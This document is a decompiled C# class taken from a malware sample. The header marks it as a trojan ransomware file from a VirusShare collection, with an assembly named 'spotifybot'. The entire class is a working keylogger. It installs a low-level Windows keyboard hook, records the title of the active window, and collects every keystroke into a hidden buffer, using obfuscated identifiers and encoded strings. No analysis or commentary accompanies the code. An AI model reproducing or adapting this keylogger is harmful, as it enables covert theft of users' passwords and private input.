// Decompiled with JetBrains decompiler
// Type: WXNWOL
// Assembly: spotifybot, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 49F8E78E-98C1-464D-B8BC-BD712E85FF5D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4708e643ab129b31b3e067f9a628b4f0e5dfa2fbd30e637e9fb217bb8c703115.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class WXNWOL
{
  private string output;
  private static IntPtr VKRKKGGC = (IntPtr) 0;
  private static string TUILYRMV = "";
  private static WXNWOL.KeyboardHookDelegate IDBXSLMM = (WXNWOL.KeyboardHookDelegate) null;

  public static string CWGCTB(IntPtr hWnd)
  {
    string str;
    try
    {
      if (hWnd.ToInt32() <= 0)
      {
        str = (string) null;
      }
      else
      {
        int windowTextLength = WXNWOL.GetWindowTextLength(hWnd);
        if (windowTextLength == 0)
        {
          str = (string) null;
        }
        else
        {
          StringBuilder lpString = new StringBuilder(checked (windowTextLength + 1));
          WXNWOL.GetWindowText((int) hWnd, lpString, lpString.Capacity);
          str = lpString.ToString().Trim();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static bool ERHVGG()
  {
    bool flag;
    try
    {
      flag = WXNWOL.VKRKKGGC != (IntPtr) 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public static void USWETQ()
  {
    try
    {
      WXNWOL.IDBXSLMM = new WXNWOL.KeyboardHookDelegate(WXNWOL.KYBRDLCK);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      WXNWOL.VKRKKGGC = (IntPtr) WXNWOL.SetWindowsHookEx(13, WXNWOL.IDBXSLMM, (int) Process.GetCurrentProcess().MainModule.BaseAddress, 0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void JEWNTPJY()
  {
    try
    {
      if (!WXNWOL.ERHVGG() || WXNWOL.UnhookWindowsHookEx((int) WXNWOL.VKRKKGGC) == 0)
        return;
      WXNWOL.VKRKKGGC = (IntPtr) 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int UnhookWindowsHookEx(int hHook);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetAsyncKeyState(int vKey);

  [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int SetWindowsHookEx(
    int idHook,
    WXNWOL.KeyboardHookDelegate lpfn,
    int hmod,
    int dwThreadId);

  public static int KYBRDLCK(int Code, int WPA, ref WXNWOL.NPPDXKJB LPA)
  {
    try
    {
      string Left = WXNWOL.CWGCTB(WXNWOL.GetForegroundWindow());
      if (Operators.CompareString(Left, WXNWOL.TUILYRMV, false) != 0)
      {
        WXNWOL.TUILYRMV = Left;
        JNXOYT.WEEHBIWG = JNXOYT.WEEHBIWG + Environment.NewLine + RUDUUFDP.CPMXFIPG("hXOKhHZXcn2EdldyfYR2V3J9hHZXcn2EdldyfYR2V3J9Hw==", "False") + Left + RUDUUFDP.CPMXFIPG("aoWQl4lqhZCXiWqFkJeJaoWQl4lqhZCXiWqFkJeJd4bADA==", "False") + Environment.NewLine + Environment.NewLine;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      string str = "";
      if (WPA == 256 | WPA == 260)
      {
        switch (LPA.WMKXHOCU)
        {
          case 8:
            JNXOYT.WEEHBIWG = JNXOYT.WEEHBIWG.Substring(0, checked (JNXOYT.WEEHBIWG.Length - 1));
            break;
          case 9:
            str = char.ConvertFromUtf32(9);
            break;
          case 13:
            str = Environment.NewLine;
            break;
          case 20:
            str = !Control.IsKeyLocked(Keys.Capital) ? RUDUUFDP.CPMXFIPG("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : RUDUUFDP.CPMXFIPG("QpiLkJF1XZSehG1dl5WHf10m", "False");
            break;
          case 27:
            str = RUDUUFDP.CPMXFIPG("S6GWy62IZh0=", "False");
            break;
          case 32:
            str = RUDUUFDP.CPMXFIPG("RyA=", "False");
            break;
          case 35:
            str = RUDUUFDP.CPMXFIPG("R52SwqqEYiE=", "False");
            break;
          case 36:
            str = RUDUUFDP.CPMXFIPG("WrCo1safsoAP", "False");
            break;
          case 37:
            str = RUDUUFDP.CPMXFIPG("U6mVvXIT", "False");
            break;
          case 38:
            str = RUDUUFDP.CPMXFIPG("SJ6ssmce", "False");
            break;
          case 39:
            str = RUDUUFDP.CPMXFIPG("X7WjyX4H", "False");
            break;
          case 40:
            str = RUDUUFDP.CPMXFIPG("O5GXpVor", "False");
            break;
          case 46:
            str = RUDUUFDP.CPMXFIPG("WrCkzMWXdQ4=", "False");
            break;
          case 48:
          case 49:
          case 50:
          case 51:
          case 52:
          case 53:
          case 54:
          case 55:
          case 56:
          case 57:
            if (MyProject.Computer.Keyboard.ShiftKeyDown)
            {
              string[] strArray = RUDUUFDP.CPMXFIPG("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False").Split(Conversions.ToChar(RUDUUFDP.CPMXFIPG("VBM=", "False")));
              switch (LPA.WMKXHOCU)
              {
                case 48:
                  str = strArray[9];
                  break;
                case 49:
                  str = strArray[0];
                  break;
                case 50:
                  str = strArray[1];
                  break;
                case 51:
                  str = strArray[2];
                  break;
                case 52:
                  str = strArray[3];
                  break;
                case 53:
                  str = strArray[4];
                  break;
                case 54:
                  str = strArray[5];
                  break;
                case 55:
                  str = strArray[6];
                  break;
                case 56:
                  str = strArray[7];
                  break;
                case 57:
                  str = strArray[8];
                  break;
              }
            }
            else
            {
              str = char.ConvertFromUtf32(LPA.WMKXHOCU);
              break;
            }
            break;
          case 65:
          case 66:
          case 67:
          case 68:
          case 69:
          case 70:
          case 71:
          case 72:
          case 73:
          case 74:
          case 75:
          case 76:
          case 77:
          case 78:
          case 79:
          case 80:
          case 81:
          case 82:
          case 83:
          case 84:
          case 85:
          case 86:
          case 87:
          case 88:
          case 89:
          case 90:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? char.ConvertFromUtf32(checked (LPA.WMKXHOCU + 32)).ToLower() : char.ConvertFromUtf32(checked (LPA.WMKXHOCU + 32)).ToUpper();
            break;
          case 112:
          case 113:
          case 114:
          case 115:
          case 116:
          case 117:
          case 118:
          case 119:
          case 120:
          case 121:
          case 122:
          case 123:
          case 124:
          case 125:
          case 126:
          case (int) sbyte.MaxValue:
          case 128:
          case 129:
          case 130:
          case 131:
          case 132:
          case 133:
          case 134:
          case 135:
            str = RUDUUFDP.CPMXFIPG("UaedGA==", "False") + Conversions.ToString(checked (LPA.WMKXHOCU - 111)) + RUDUUFDP.CPMXFIPG("o4EC", "False");
            break;
          case 162:
          case 163:
            str = RUDUUFDP.CPMXFIPG("Vaue0cKpwsrOsVUS", "False");
            break;
          case 164:
          case 165:
            str = RUDUUFDP.CPMXFIPG("RJqLvbeBXyQ=", "False");
            break;
          case 186:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? RUDUUFDP.CPMXFIPG("cBI=", "False") : RUDUUFDP.CPMXFIPG("axY=", "False");
            break;
          case 187:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? RUDUUFDP.CPMXFIPG("WSs=", "False") : RUDUUFDP.CPMXFIPG("bAY=", "False");
            break;
          case 188:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? RUDUUFDP.CPMXFIPG("YhE=", "False") : RUDUUFDP.CPMXFIPG("XCc=", "False");
            break;
          case 189:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? RUDUUFDP.CPMXFIPG("cAQ=", "False") : RUDUUFDP.CPMXFIPG("eC4=", "False");
            break;
          case 190:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? RUDUUFDP.CPMXFIPG("ZRA=", "False") : RUDUUFDP.CPMXFIPG("bRg=", "False");
            break;
          case 191:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? RUDUUFDP.CPMXFIPG("aQ0=", "False") : RUDUUFDP.CPMXFIPG("gQU=", "False");
            break;
          case 192:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? RUDUUFDP.CPMXFIPG("lBM=", "False") : RUDUUFDP.CPMXFIPG("vQg=", "False");
            break;
          case 219:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? RUDUUFDP.CPMXFIPG("mgg=", "False") : RUDUUFDP.CPMXFIPG("wAI=", "False");
            break;
          case 220:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? RUDUUFDP.CPMXFIPG("czA=", "False") : RUDUUFDP.CPMXFIPG("vwQ=", "False");
            break;
          case 221:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? RUDUUFDP.CPMXFIPG("gSM=", "False") : RUDUUFDP.CPMXFIPG("rBg=", "False");
            break;
          case 222:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? RUDUUFDP.CPMXFIPG("bQE=", "False") : RUDUUFDP.CPMXFIPG("Ths=", "False");
            break;
          default:
            str = char.ConvertFromUtf32(LPA.WMKXHOCU);
            break;
        }
        JNXOYT.WEEHBIWG += str;
        JNXOYT.GBHXC = JNXOYT.WEEHBIWG;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    int num;
    return num;
  }

  [DllImport("user32.dll", SetLastError = true)]
  public static extern IntPtr GetForegroundWindow();

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern int GetWindowTextLength(IntPtr hwnd);

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetWindowText(int hwnd, StringBuilder lpString, int cch);

  public WXNWOL(string output)
  {
    try
    {
      this.output = output;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private delegate int KeyboardHookDelegate(int Code, int wParam, ref WXNWOL.NPPDXKJB lParam);

  public struct NPPDXKJB
  {
    public int WMKXHOCU;
    public int MOKESGGI;
    public int LSDLUOTI;
    public int CPNRJQEW;
    public int JUEMBSVI;
  }
}
